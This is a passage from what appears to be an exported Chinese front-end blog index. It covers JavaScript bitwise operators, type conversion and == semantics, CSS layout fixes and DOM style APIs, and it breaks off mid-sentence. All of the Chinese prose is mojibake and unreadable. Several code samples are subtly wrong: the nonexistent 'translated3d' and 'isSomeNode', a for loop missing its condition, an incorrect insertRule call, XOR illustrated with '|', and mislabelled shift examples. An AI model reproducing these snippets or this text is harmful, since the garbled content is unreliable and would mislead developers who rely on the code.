    <content type="text"><![CDATA[å‰è¨€åœ¨å¹³å¸¸çš„å·¥ä½œä¸­ä½è¿ç®—ç”¨å¾—æ¯”è¾ƒå°‘ï¼Œä¸€èˆ¬ç”¨å…¶ä»–æ›´å®¹æ˜“ç†è§£å¾—æ–¹å¼åŽ»è¾¾åˆ°ç›¸åŒç›®çš„ã€‚åœ¨è®¡ç®—æœºå†…éƒ¨ï¼Œä¸€åˆ‡è¿ç®—æœ€ç»ˆéƒ½è½¬åŒ–æˆäºŒçº§åˆ¶å…ƒç®—ï¼Œç›´æŽ¥ä½¿ç”¨äºŒçº§åˆ¶è¿ç®—æ‰§è¡Œå¾—æ•ˆçŽ‡æ˜¯æœ€é«˜çš„ã€‚å¶å°”çœ‹åˆ°ä¸€é“é¢è¯•é¢˜ï¼Œå¤ä¹ ä¸€ä¸‹è¿™æ–¹é¢çŸ¥è¯†ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹è¿™é“é¢è¯•é¢˜ï¼š 123var a = 10;a ^= (1&lt;&lt;4) - 1;açš„å€¼ é¢˜ç›®å…ˆæ”¾ä¸€æ”¾ï¼Œçœ‹çœ‹jsä¸­æœ‰å“ªäº›ä½è¿ç®—ã€‚ 1. ä½ä¸Ž(&amp;)çœŸçœŸä¸ºçœŸï¼Œå…¶ä½™ä¸ºå‡ 1234569å’Œ10äºŒè¿›åˆ¶ä½ä¸Žè¿ç®— 1001 &amp; 1010 ------- 1000 ç”±äºŽå¥‡æ•°çš„äºŒè¿›åˆ¶æœ«ä½ä¸º1ï¼Œå¶æ•°ä¸º0ï¼Œè·Ÿ1çš„ä½ä¸Žè¿ç®—åŽï¼Œåˆ†åˆ«ä¸º1å’Œ0ï¼Œå› æ­¤å¯ä»¥ç”¨ä½ä¸Žè¿ç®—æ¥åˆ¤æ–­å¥‡å¶æ•°ã€‚ 12345if(n &amp; 1) &#123; console.log('nä¸ºå¥‡æ•°');&#125; else &#123; console.log('nä¸ºå¶æ•°');&#125; 2. ä½æˆ–(|)å‡å‡ä¸ºå‡ï¼Œå…¶ä½™ä¸ºçœŸ 1234569å’Œ10äºŒè¿›åˆ¶ä½æˆ–è¿ç®— 1001 | 1010 ------- 1011 æ•´æ•°ä¸Ž0çš„ä½æˆ–è¿ç®—ï¼Œéƒ½æ˜¯æœ¬èº«ã€‚æµ®ç‚¹æ•°ä¸æ”¯æŒä½è¿ç®—ï¼Œè¿‡ç¨‹ä¸­ä¼šè‡ªåŠ¨è½¬åŒ–æˆæ•´æ•°ï¼Œåˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå¯ä»¥å°†æµ®ç‚¹æ•°ä¸Ž0è¿›è¡Œä½æˆ–è¿ç®—å³å¯è¾¾åˆ°å–æ•´ç›®çš„ã€‚ 1console.log(15.22 | 0); // 15 3. ä½éž(~)çœŸä¸ºå‡ï¼Œå‡ä¸ºçœŸ 1234567899äºŒè¿›åˆ¶ä½éžè¿ç®— ~ 0000000000000000 0000000000001001 -------å–å 1111111111111111 1111111111110110 -------ç¬¦å·ä½ä¸å˜ï¼Œå…¶ä½™å–å 1000000000000000 0000000000001001 -------åŠ 1 1000000000000000 0000000000001010 æŒ‰ä½éžæ“ä½œï¼Œé¦–å…ˆæ¯ä¸€ä½å–åï¼Œç„¶åŽï¼Œç¬¬ä¸€ä½ä¸ºè´Ÿæ•°ç¬¦å·ä½ä¿æŒä¸å˜ï¼Œå‰©ä½™å–ååŠ 1å°±æ˜¯æœ€åŽç»“æžœã€‚ 4. å¼‚æˆ–(^)ç›¸åŒä¸ºå‡ï¼Œä¸åŒä¸ºçœŸ 1234569å’Œ10äºŒè¿›åˆ¶å¼‚æˆ–è¿ç®— 1001 | 1010 ------- 0011 å¯ä»¥ç”¨äºŽäº¤æ¢ä¸¤ä¸ªæ•´æ•°çš„å€¼ï¼Œä¸è¿‡ä¸€èˆ¬å¾ˆå°‘è¿™ä¹ˆç”¨ 123456var a = 3, b = 5;a ^= b;b ^= a;a ^= b;console.log('a:', a); // 5console.log('b:', b); // a 5. æœ‰ç¬¦å·å·¦ç§»(&lt;&lt;)é¦–ä½ç¬¦å·ä¸ºä¸åŠ¨ï¼ŒæŠŠ32ä½äºŒè¿›åˆ¶æ•°å­—æ•´ä½“å¾€å·¦è¾¹ç§»åŠ¨æŒ‡å®šä½æ•°ï¼Œå·¦è¾¹è¶…å‡ºéƒ¨åˆ†è¢«èˆåŽ»ï¼Œå³è¾¹è¡¥0ã€‚ 123459äºŒè¿›åˆ¶æœ‰ç¬¦å·å·¦ç§»5ä½ 9&lt;&lt;5 0000000000000000 0000000000001001 ------ 0000000000000000 0000000100100000 è®¡ç®—æœºå†…æ˜¯è¿™æ ·ä½ç§»è®¡ç®—çš„ï¼Œå®žé™…åº”ç”¨è®¡ç®—æˆ‘ä»¬å¯ä»¥é€šè¿‡å…¬å¼ï¼šnum * (2^n)ï¼Œå³ï¼š9*Math.pow(2,5) 6. æœ‰ç¬¦å·å³ç§»(&gt;&gt;)é¦–ä½ç¬¦å·ä¸ºä¸åŠ¨ï¼ŒæŠŠ32ä½äºŒè¿›åˆ¶æ•°å­—æ•´ä½“å¾€å³è¾¹ç§»åŠ¨æŒ‡å®šä½æ•°ï¼Œå³è¾¹è¶…å‡ºéƒ¨åˆ†è¢«èˆåŽ»ï¼Œå·¦è¾¹è¡¥0ã€‚ 12345288äºŒè¿›åˆ¶æœ‰ç¬¦å·å³ç§»5ä½ 9&gt;&gt;5 0000000000000000 0000000100100000 ------ 0000000000000000 0000000000001001 è®¡ç®—æœºå†…æ˜¯è¿™æ ·ä½ç§»è®¡ç®—çš„ï¼Œå®žé™…åº”ç”¨è®¡ç®—æˆ‘ä»¬å¯ä»¥é€šè¿‡å…¬å¼ï¼šnum / (2^n)ï¼Œå³ï¼š288/Math.pow(2,5) 7. æ— ç¬¦å·å³ç§»(&gt;&gt;&gt;)ç¬¦å·ä¸ºä¹Ÿè·Ÿç€ä¸€èµ·ç§»åŠ¨ï¼Œè¿™æ ·ï¼Œæ— ç¬¦å·å³ç§»ä¼šæŠŠè´Ÿæ•°çš„äºŒè¿›åˆ¶å½“æˆæ•´æ•°çš„äºŒè¿›åˆ¶ç  123454294967296äºŒè¿›åˆ¶æ— æœ‰ç¬¦å·å³ç§»5ä½ 4294967296&gt;&gt;&gt;5 1000000000000000 0000000000000000 ------ 0000010000000000 0000000000000000 å›žå½’é¢è¯•é¢˜12var a = 10;a ^= (1&lt;&lt;4) - 1; 1&lt;&lt;4å·¦ç§»4ä½ï¼Œå³1*Math.pow(2, 4) == 16ï¼Œåˆ™a ^= 15 1234510å’Œ15çš„å¼‚æˆ–è¿ç®— 1111 ^ 1010 ......... 0101 0101äºŒè¿›åˆ¶è¡¨ç¤º5ï¼Œæ‰€ä»¥açš„å€¼ä½5]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>ä½è¿ç®—</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jsæ•°æ®ç±»åž‹è½¬åŒ–]]></title>
    <url>%2F2017%2F06%2F18%2Fjs%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E5%8C%96%2F</url>
    <content type="text"><![CDATA[æ•°æ®ç±»åž‹è½¬åŒ–è¡¨é¦–å…ˆä¸Šæ•°æ®ç±»åž‹è½¬åŒ–è¡¨ï¼Œä¾¿äºŽé‡åˆ°é—®é¢˜ç›´æŽ¥æŸ¥çœ‹ å€¼ å­—ç¬¦ä¸² æ•°å­— å¸ƒå°”å€¼ å¯¹è±¡ undefined null â€œundefinedâ€ â€œnullâ€ NaN false false throws TypeError throws TypeError true false â€œtrueâ€ â€œfalseâ€ 1 0 new Boolean(true) new Boolean(false) â€œâ€(ç©ºå­—ç¬¦ä¸²) â€œ1.2â€(éžç©ºï¼Œæ•°å­—) â€œoneâ€ï¼ˆéžç©ºï¼Œéžæ•°å­—ï¼‰ 0 1.2 NaN false true true new String(â€œâ€) new String(â€œ1.2â€) new String(â€œoneâ€) 0 -0 NaN Infinity -Infinity 1ï¼ˆéžé›¶ï¼‰ â€œ0â€ â€œ0â€ â€œNaNâ€ â€œInfinityâ€ â€œ-Infinityâ€ â€œ1â€ new Number(0) new Number(-0) new Number(NaN) new Number(Infinity) new Number(-Infinity) new Number(1) {}ï¼ˆä»»æ„å¯¹è±¡ï¼‰ [] [9] [â€œaâ€] {}.toString() -&gt; {}.valueOf() â€œâ€ â€œ9â€ ä½¿ç”¨join() {}.valueOf() -&gt; {}.toString() 0 9 NaN NaN true true true true æ˜¾å¼è½¬æ¢æ˜¾ç¤ºè½¬æ¢æœ€ç®€å•çš„æ˜¯ä½¿ç”¨Boolean()ã€Number()ã€String()æˆ–Object()æž„é€ å‡½æ•° 1234Number(&quot;3&quot;); // 3String(false); // &quot;false&quot;Boolean([]); // trueObject(3); // new Number(3) ps:å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¯•å›¾æŠŠundefinedæˆ–nullè½¬æ¢ä¸ºå¯¹è±¡ï¼Œä¼šæŠ›å‡ºä¸€ä¸ªç±»åž‹é”™è¯¯ï¼Œè€ŒObject()æ˜¾ç¤ºè½¬æ¢ä¸ä¼šï¼Œè€Œæ˜¯è¿”å›žä¸€ä¸ªæ–°åˆ›å»ºçš„ç©ºå¯¹è±¡ æ˜¾ç¤ºè½¬æ¢è¿˜æœ‰toString()ã€toFixed()ã€toExponential()ã€toPrecision()ã€parseInt()ã€parseFloat()æ–¹æ³•ï¼Œä¸ç»†è¯´ éšå¼è½¬æ¢éšå¼è½¬æ¢åˆ†ä¸ºä¸‰ç§ï¼š å°†å€¼è½¬æ¢ä¸ºåŽŸå§‹å€¼ï¼ŒToPrimitive(input, PreferredType) å°†å€¼è½¬åŒ–ä¸ºæ•°å­—ï¼ŒToNumber() å°†å€¼è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼ŒToString() åŽŸå§‹ç±»åž‹æ•°æ®è½¬åŒ–ç›¸å¯¹æ¯”è¾ƒç®€å•ï¼Œä¸‹é¢å€¼çœ‹å¯¹è±¡åˆ°åŽŸå§‹ç±»åž‹çš„è½¬æ¢æ–¹å¼ å¯¹è±¡çš„toString()å’ŒvalueOf()æ–¹æ³• æ‰€æœ‰å¯¹è±¡ç»§æ‰¿äº†ä¸¤ä¸ªè½¬æ¢æ–¹æ³•ï¼štoString() ä¸€èˆ¬å¯¹è±¡è½¬åŒ–æˆ[object object] {x: 1, y: 2}.toString(); // &quot;[object object]&quot; æ•°ç»„è½¬åŒ–æˆå…ƒç´ é—´åŠ é€—å· [1, 2, 3].toString(); // &quot;1,2,3&quot; å‡½æ•°è½¬åŒ–æˆå®šä¹‰(function(x){}).toString(); // &quot;function(x) {}&quot; æ­£åˆ™è½¬åŒ–ä¸ºç›´æŽ¥é‡å­—ç¬¦ä¸² /\d+/g.toString(); // &quot;/\d+/g&quot; æ—¥æœŸè½¬åŒ–ä¸ºæ—¥æœŸå­—ç¬¦ä¸² new Date(2000, 1, 1).toString(); // â€œTue Feb 01 2000 00:00:00 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´)â€ valueOf()æ–¹æ³• å¤§å¤šæ•°å¯¹è±¡æ— æ³•çœŸæ­£è¡¨ç¤ºä¸ºä¸€ä¸ªåŽŸå§‹å€¼ï¼ŒvalueOf()ç®€å•è¿”å›žå¯¹è±¡æœ¬èº« æ—¥æœŸå¯¹è±¡æ˜¯ä¸€ä¸ªç‰¹ä¾‹ï¼Œè¿”å›žæ¯«ç§’æ•° new Date(2010, 0, 1).valueOf(); // 12623328000 å¯¹è±¡åˆ°å­—ç¬¦ä¸²çš„è½¬æ¢ å¦‚æžœå¯¹è±¡å…·æœ‰toString()æ–¹æ³•ï¼Œåˆ™è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¦‚æžœå®ƒè¿”å›žä¸€ä¸ªåŽŸå§‹å€¼ï¼Œå°†è¿™ä¸ªå€¼è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›žè¿™ä¸ªå­—ç¬¦ä¸²ç»“æžœ å¦‚æžœå¯¹è±¡æ²¡æœ‰toString()æ–¹æ³•ï¼Œæˆ–è€…ä¸ªè¿™ä¸ªæ–¹æ³•ä¸è¿”å›žä¸€ä¸ªåŽŸå§‹å€¼ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨valueOf()æ–¹æ³•ã€‚å¦‚æžœå­˜åœ¨è¿™ä¸ªæ–¹æ³•ï¼Œåˆ™è°ƒç”¨å®ƒï¼Œå¦‚æžœè¿”å›žå€¼æ˜¯ä¸€ä¸ªåŽŸå§‹å€¼ï¼Œå°†è¿™ä¸ªå€¼è½¬åŒ–ä¸ºåªæœä»Žï¼Œå¹¶è¿”å›žè¿™ä¸ªå­—ç¬¦ä¸²ç»“æžœ å¦åˆ™ï¼Œå°±ä¼šæŠ›å‡ºä¸€ä¸ªç±»åž‹é”™è¯¯å¼‚å¸¸ å¯¹è±¡åˆ°æ•°å­—çš„è½¬æ¢ å¦‚æžœå¯¹è±¡å…·æœ‰valueOf()æ–¹æ³•ï¼ŒåŽè€…è¿”å›žä¸ªäº¿åŽŸå§‹å€¼ï¼Œåˆ™å°†è¿™ä¸ªåŽŸå§‹å€¼è½¬åŒ–ä¸ºæ•°å­—ï¼Œå¹¶è¿”å›žè¿™ä¸ªæ•°å­— å¦åˆ™ï¼Œå¦‚æžœå¯¹è±¡æœ‰toString()æ–¹æ³•ï¼ŒåŽè€…è¿”å›žä¸€ä¸ªåŽŸå§‹å€¼ï¼Œå¹¶è½¬åŒ–æˆæ•°å­—è¿”å›ž å¦åˆ™ï¼ŒæŠ›å‡ºä¸€ä¸ªç±»åž‹é”™è¯¯å¼‚å¸¸ ä¸¾ä¸ªæ —å­ï¼š ({} + {}) = ? ä¸¤ä¸ªå¯¹è±¡çš„å€¼è¿›è¡Œ+è¿ç®—ç¬¦ï¼Œè¦å…ˆè¿›è¡Œéšå¼è½¬æ¢æˆåŽŸå§‹ç±»åž‹æ‰èƒ½è®¡ç®— 1. ToPrimitiveè½¬æ¢ï¼Œå› ä¸ºæ²¡æœ‰æŒ‡å®šPreferredTypeç±»åž‹ï¼Œé»˜è®¤ä¸ºNumber 2. æ‰§è¡Œ`valueOf()`æ–¹æ³•ï¼Œ`{}.valueOf()`è¿”å›žçš„è¿˜æ˜¯{}å¯¹è±¡ 3. ç»§ç»­æ‰§è¡Œ`toString()`æ–¹æ³•ï¼Œ`({}).toString()`è¿”å›ž`[Object Object]`ï¼Œæ˜¯åŽŸå§‹å€¼ æ‰€ä»¥æœ€åŽç»“æžœï¼š[Object Object][Object Object]ps:åœ¨Firefoxä¸­è¿”å›žç»“æžœä¸ºNaNï¼Œå› ä¸ºç¬¬ä¸€ä¸ª{}è¢«å½“ä½œä¸€ä¸ªä»£ç å—ï¼Œæ²¡æœ‰è§£æžè½¬æ¢ï¼Œå˜æˆäº†+{}ï¼Œä¹Ÿå°±æ˜¯+[Object Object]ï¼Œæœ€ç»ˆå˜æˆNaN ==å…ƒç®—ç¬¦éšå¼è½¬æ¢==è¿ç®—ç¬¦åº”ç”¨å’Œè€ƒå¯Ÿç‚¹å¾ˆå¤šï¼Œç›´æŽ¥ä¸ŠES5è§„èŒƒæ–‡æ¡£ 1234567891011121314151617181920212223242526æ¯”è¾ƒè¿ç®— x==y, å…¶ä¸­ x å’Œ y æ˜¯å€¼ï¼Œè¿”å›ž true æˆ–è€… falseã€‚è¿™æ ·çš„æ¯”è¾ƒæŒ‰å¦‚ä¸‹æ–¹å¼è¿›è¡Œï¼š1ã€è‹¥ Type(x) ä¸Ž Type(y) ç›¸åŒï¼Œ åˆ™ 1* è‹¥ Type(x) ä¸º Undefinedï¼Œ è¿”å›ž trueã€‚ 2* è‹¥ Type(x) ä¸º Nullï¼Œ è¿”å›ž trueã€‚ 3* è‹¥ Type(x) ä¸º Numberï¼Œ åˆ™ (1)ã€è‹¥ x ä¸º NaNï¼Œ è¿”å›ž falseã€‚ (2)ã€è‹¥ y ä¸º NaNï¼Œ è¿”å›ž falseã€‚ (3)ã€è‹¥ x ä¸Ž y ä¸ºç›¸ç­‰æ•°å€¼ï¼Œ è¿”å›ž trueã€‚ (4)ã€è‹¥ x ä¸º +0 ä¸” y ä¸º âˆ’0ï¼Œ è¿”å›ž trueã€‚ (5)ã€è‹¥ x ä¸º âˆ’0 ä¸” y ä¸º +0ï¼Œ è¿”å›ž trueã€‚ (6)ã€è¿”å›ž falseã€‚ 4* è‹¥ Type(x) ä¸º String, åˆ™å½“ x å’Œ y ä¸ºå®Œå…¨ç›¸åŒçš„å­—ç¬¦åºåˆ—ï¼ˆé•¿åº¦ç›¸ç­‰ä¸”ç›¸åŒå­—ç¬¦åœ¨ç›¸åŒä½ç½®ï¼‰æ—¶è¿”å›ž trueã€‚ å¦åˆ™ï¼Œ è¿”å›ž falseã€‚ 5* è‹¥ Type(x) ä¸º Boolean, å½“ x å’Œ y ä¸ºåŒä¸º true æˆ–è€…åŒä¸º false æ—¶è¿”å›ž trueã€‚ å¦åˆ™ï¼Œ è¿”å›ž falseã€‚ 6* å½“ x å’Œ y ä¸ºå¼•ç”¨åŒä¸€å¯¹è±¡æ—¶è¿”å›ž trueã€‚å¦åˆ™ï¼Œè¿”å›ž falseã€‚2ã€è‹¥ x ä¸º null ä¸” y ä¸º undefinedï¼Œ è¿”å›ž trueã€‚3ã€è‹¥ x ä¸º undefined ä¸” y ä¸º nullï¼Œ è¿”å›ž trueã€‚4ã€è‹¥ Type(x) ä¸º Number ä¸” Type(y) ä¸º Stringï¼Œè¿”å›žæ¯”è¾ƒ x == ToNumber(y) çš„ç»“æžœã€‚5ã€è‹¥ Type(x) ä¸º String ä¸” Type(y) ä¸º Numberï¼Œè¿”å›žæ¯”è¾ƒ ToNumber(x) == y çš„ç»“æžœã€‚6ã€è‹¥ Type(x) ä¸º Booleanï¼Œ è¿”å›žæ¯”è¾ƒ ToNumber(x) == y çš„ç»“æžœã€‚7ã€è‹¥ Type(y) ä¸º Booleanï¼Œ è¿”å›žæ¯”è¾ƒ x == ToNumber(y) çš„ç»“æžœã€‚8ã€è‹¥ Type(x) ä¸º String æˆ– Numberï¼Œä¸” Type(y) ä¸º Objectï¼Œè¿”å›žæ¯”è¾ƒ x == ToPrimitive(y) çš„ç»“æžœã€‚9ã€è‹¥ Type(x) ä¸º Object ä¸” Type(y) ä¸º String æˆ– Numberï¼Œ è¿”å›žæ¯”è¾ƒ ToPrimitive(x) == y çš„ç»“æžœã€‚10ã€è¿”å›ž falseã€‚ æ€»ç»“èµ·æ¥æœ‰å¦‚ä¸‹å‡ ç‚¹å€¼å¾—æ³¨æ„ NaN !== NaN x,y ä¸ºnullã€undefinedä¸¤è€…ä¸­ä¸€ä¸ª // è¿”å›žtrue xã€yä¸ºNumberå’ŒStringç±»åž‹æ—¶ï¼Œåˆ™è½¬æ¢ä¸ºNumberç±»åž‹æ¯”è¾ƒ æœ‰Booleanç±»åž‹æ—¶ï¼ŒBooleanè½¬åŒ–ä¸ºNumberç±»åž‹æ¯”è¾ƒ ä¸€ä¸ªObjectç±»åž‹ï¼Œä¸€ä¸ªStringæˆ–Numberç±»åž‹ï¼Œå°†Objectç±»åž‹è¿›è¡ŒåŽŸå§‹è½¬æ¢åŽï¼ŒæŒ‰ä¸Šé¢æµç¨‹è¿›è¡ŒåŽŸå§‹å€¼æ¯”è¾ƒ ä¸¾ä¸€ä¸ªæ —å­ï¼š123456789var a = &#123; valueOf: function () &#123; return 1; &#125;, toString: function () &#123; return&apos;123&apos; &#125;&#125;console.log(true == a) // true; 1. é¦–å…ˆï¼Œxä¸Žyç±»åž‹ä¸åŒï¼Œxä¸ºbooleanç±»åž‹ï¼Œåˆ™è¿›è¡ŒToNumberè½¬æ¢ä¸º1,ä¸ºnumberç±»åž‹ 2. xä¸ºnumberï¼Œyä¸ºobjectç±»åž‹ï¼Œå¯¹yè¿›è¡ŒåŽŸå§‹è½¬æ¢ï¼ŒToPrimitive(a, ?),æ²¡æœ‰æŒ‡å®šè½¬æ¢ç±»åž‹ï¼Œé»˜è®¤numberç±»åž‹ 3. ToPrimitive(a, Number)é¦–å…ˆè°ƒç”¨valueOfæ–¹æ³•ï¼Œè¿”å›ž1ï¼Œå¾—åˆ°åŽŸå§‹ç±»åž‹1ã€‚ 4. 1 == 1ï¼Œ è¿”å›žtrue ` åŒç†é€‚ç”¨äºŽ&gt;ã€&lt;ã€!=ã€+è¿ç®—ç¬¦çš„éšå¼è½¬æ¢ï¼ˆä½†è¦é™¤åŽ»æ—¥æœŸå¯¹è±¡ï¼‰]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cssä¸­çš„ä¸€äº›å‘]]></title>
    <url>%2F2017%2F05%2F06%2Fcss%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91%2F</url>
    <content type="text"><![CDATA[1ã€å¦‚æžœå­å…ƒç´ å…¨éƒ¨è®¾ç½®ä¸ºæµ®åŠ¨ï¼Œåˆ™çˆ¶å…ƒç´ æ˜¯å¡Œé™·çš„ åœ¨å…ƒç´ æœ«å°¾åŠ å—çº§ç©ºå…ƒç´ è®¾ç½®clear:bothï¼› 1234.last &#123; display: block; clear: both;&#125; åœ¨çˆ¶çº§å®¹å™¨è®¾ç½®before/afteræ¨¡æ‹Ÿä¸€ä¸ªå—çº§ç©ºå…ƒç´  12345.clearfix:after &#123; content: ""; display: block; clear: both;&#125; çˆ¶çº§å®¹å™¨ç›´æŽ¥è®¾ç½®overflow: auto/hidden; 2ã€æ™®é€šæ–‡æ¡£æµä¸­å—çº§åž‚ç›´å¤–è¾¹è·åˆå¹¶è§£å†³åŠžæ³•ï¼šç”¨paddingä»£æ›¿ï¼Œæˆ–æ”¹æˆinline-blockï¼Œæˆ–æ”¹æˆfloatï¼Œæˆ–ç»å¯¹å®šä½ 3ã€ä½¿ç”¨transitioné—ªå±12345.demo &#123; -webkit-transform-style: preserve-3d; -webkit-backface-visibility: hidden; -webkit-perspective: 1000&#125; è¿‡æ¸¡åŠ¨ç”»åœ¨æ²¡æœ‰å¯åŠ¨ç¡¬ä»¶åŠ é€Ÿçš„æƒ…å†µä¸‹ï¼Œä¼šå‡ºçŽ°æŠ–åŠ¨çŽ°è±¡ï¼Œè§£å†³æ–¹æ¡ˆï¼šç”¨translated3dã€translateZã€transformè‡ªåŠ¨å¯åŠ¨ç¡¬ä»¶åŠ é€Ÿï¼Œå³æ”¹ä¸ºï¼š 1234.demo &#123; -webkit-transform: translated3d(0,0,0); transform: translated3d(0,0,0);&#125; ps:ç¡¬ä»¶åŠ é€Ÿå¯¼è‡´cpuæ€§èƒ½å ç”¨å¢žåŠ ï¼Œç”µæ± ç”µé‡æ¶ˆè€—åŠ å¤§ 4ã€è¶…å‡ºå†…å®¹ç”¨â€â€¦â€è¡¨ç¤º123&lt;div class="line-clamp"&gt;æ¥ç‚¹å±•ç¤ºå†…å®¹ï¼Œæ¥ç‚¹å±•ç¤ºå†…å®¹ï¼Œæ¥ç‚¹å±•ç¤ºå†…å®¹ï¼Œæ¥ç‚¹å±•ç¤ºå†…å®¹ï¼Œæ¥ç‚¹å±•ç¤ºå†…å®¹ï¼Œæ¥ç‚¹å±•ç¤ºå†…å®¹ï¼Œæ¥ç‚¹å±•ç¤ºå†…å®¹ï¼Œæ¥ç‚¹å±•ç¤ºå†…å®¹ï¼Œæ¥ç‚¹å±•ç¤ºå†…å®¹ï¼Œæ¥ç‚¹å±•ç¤ºå†…å®¹&lt;/div&gt; 1234567.line-clamp &#123; width: 300px; display: -webkit-box; -webkit-box-orient: vertical; -webkit-line-clamp: 3; overflow: hidden;&#125; è¯´æ˜Žï¼š -webkit-line-clampç”¨æ¥é™åˆ¶åœ¨ä¸€ä¸ªå—å…ƒç´ æ˜¾ç¤ºçš„æ–‡æœ¬çš„è¡Œæ•° display: -webkit-box; å¿…é¡»ç»“åˆçš„å±žæ€§ ï¼Œå°†å¯¹è±¡ä½œä¸ºå¼¹æ€§ä¼¸ç¼©ç›’å­æ¨¡åž‹æ˜¾ç¤º -webkit-box-orient å¿…é¡»ç»“åˆçš„å±žæ€§ ï¼Œè®¾ç½®æˆ–æ£€ç´¢ä¼¸ç¼©ç›’å¯¹è±¡çš„å­å…ƒç´ çš„æŽ’åˆ—æ–¹å¼ ç¼ºç‚¹ï¼šåªæœ‰ç§»åŠ¨ç«¯å’Œwebkitæµè§ˆå™¨æ”¯æŒ è¿˜ä¸å¤Ÿï¼Œæœ€åŽæœ«å°¾æœ€å¥½æœ‰ç‚¹æ¸å˜åˆ°â€â€¦â€ 12345678910111213141516.line-clamp &#123; width: 300px; line-height: 20px; height: 40px; overflow: hidden; position: relative;&#125;.line-clamp:after &#123; content: "..."; position: absolute; bottom: 0; right: 0; padding-left: 40px; background: linear-gradient(to right, transparent, #fff 55%);&#125; è¯´æ˜Žï¼š å°†heightè®¾ç½®ä¸ºline-heightæ•´æ•°å€ï¼Œé˜²æ­¢è¶…å‡ºæ–‡å­—éœ²å‡º ie10+æ‰æ”¯æŒlinear-gradientå±žæ€§ ç¼ºç‚¹ï¼š å½“æ–‡å­—å°‘äºŽåŒºåŸŸå¤§å°æ—¶ï¼Œä¹Ÿä¼šå‡ºçŽ°çœç•¥å· è¾“å…¥æ¡†placeholderæ–‡å­—å¸¦é¢œè‰²1234567891011121314151617input::-webkit-input-placeholder &#123; /* WebKit browsers */ font-size: 14px; color: #009a61;&#125;input::-moz-placeholder &#123; /* Mozilla Firefox 19+ */ font-size: 14px; color: #009a61;&#125;input:-ms-input-placeholder &#123; /* Internet Explorer 10+ */ font-size: 14px; color: #009a61;&#125;]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScriptæ€ç»´å¯¼å›¾]]></title>
    <url>%2F2017%2F04%2F04%2FJavaScript%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[ã€ŠJavaScripté«˜çº§ç¨‹åºã€‹å·²è¿‡ä¸€éï¼Œæ¢³ç†jsåŸºç¡€çŸ¥è¯†ç‚¹ï¼Œæ€ç»´å¯¼å›¾æ˜¯æžæœ‰å¸®åŠ©çš„ï¼Œæœäº†ä¸€ä¸‹ï¼Œè¿˜çœŸæœ‰æ•´ç†å¾—å¾ˆå…¨çš„ï¼Œæ”¶è—ä¸€æ³¢ã€‚ 1. å˜é‡ 2. æ•°ç»„ 3. è¿ç®—ç¬¦ 4. æµç¨‹è¯­å¥ 5. å­—ç¬¦ä¸²å‡½æ•° 6. DOMæ“ä½œ 7. BOMæ“ä½œ 8. windowå¯¹è±¡ 9. å‡½æ•° 10. æ­£åˆ™è¡¨è¾¾å¼ 11. DOMå¯¹è±¡]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ—¥å¸¸é˜…è¯»ç¬”è®°]]></title>
    <url>%2F2017%2F04%2F02%2Fdaily%20reading%20note%2F</url>
    <content type="text"><![CDATA[è®°å½•æ—¥å¸¸çœ‹ä¹¦ã€çœ‹åšå®¢å°è®°DOM2 DOM3 æœ‰å…³å±žæ€§æ£€æµ‹èŠ‚ç‚¹æ˜¯å¦ç›¸ç­‰ isSomeNode isEqualNode 123456div1 = document.createElement('div')div2 = document.createElement('div')div1.isSameNode(div1) // truediv1.isSameNode(div2) // falsediv1.isEqualNode(div2) // true èŽ·å–æ¡†æž¶æ–‡æ¡£å¯¹è±¡ contentDocument contentWindow 12var iframe = document.getElementById('myIframe')var iframeDoc = iframe.contentDocument || iframe.contentWindow.document èŽ·å–è¡Œé—´æ ·å¼é‡åˆ° float è¦ç”¨ styleFloat 1myDiv.styleFloat = 'left' å‡ ä¸ªé‡è¦æ ·å¼å±žæ€§å’Œæ–¹æ³• cssText length item(index) getPropertyValue(propertyName) removeProperty(propertyName) setProperty(propertyName, value, priority) 123456789var demo = document.getElementById('demo')var prop, val, i, lenfor (var i = 0, len = demo.style.length; i &lt; len; i++) &#123; prop = demo.style[i] val = demo.style.getPropertyValue(prop) console.log(prop, val)&#125; è®¡ç®—æ ·å¼ computedStyleie9-ä½¿ç”¨ oDiv.currentStyle 123var computedStyle = document.getComputedStyle(oDiv, null)var bl = computedStyle.borderLeftStyle å¯¹æ ·å¼è¡¨æ“ä½œ 12345var sheet = null;for(var i = 0, len = document.styleSheets.length; i++) &#123; sheet =document.styleSheets[i]; console.log(sheet.href);&#125; 123456var sheet = document.styleSheets[0]var rules = sheet.cssRules || sheet.rulesvar value = rules[0]rule.style.backgroundColor = 'red'// æ’å…¥ä¸€æ¡æ ·å¼åˆ°æ ·å¼è¡¨sheet.insertRule('body', 'background-color:red;', 0) â€”â€”2017/11/24 æ ·å¼ç›¸å…³åç§»é‡ offsetHeight = å…ƒç´ é«˜åº¦ + ï¼ˆå¯è§ï¼‰æ°´å¹³æ»šåŠ¨æ¡é«˜åº¦ + ä¸Šè¾¹æ¡†é«˜åº¦ + ä¸‹è¾¹æ¡†é«˜åº¦ï¼› offsetWidth = å…ƒç´ å®½åº¦ + ï¼ˆå¯è§ï¼‰åž‚ç›´æ»šåŠ¨æ¡å®½åº¦ + å·¦è¾¹æ¡†é«˜åº¦ + å³è¾¹æ¡†é«˜åº¦ï¼› offsetLeft = å…ƒç´ å·¦è¾¹æ¡†è‡³åŒ…å«å…ƒç´ 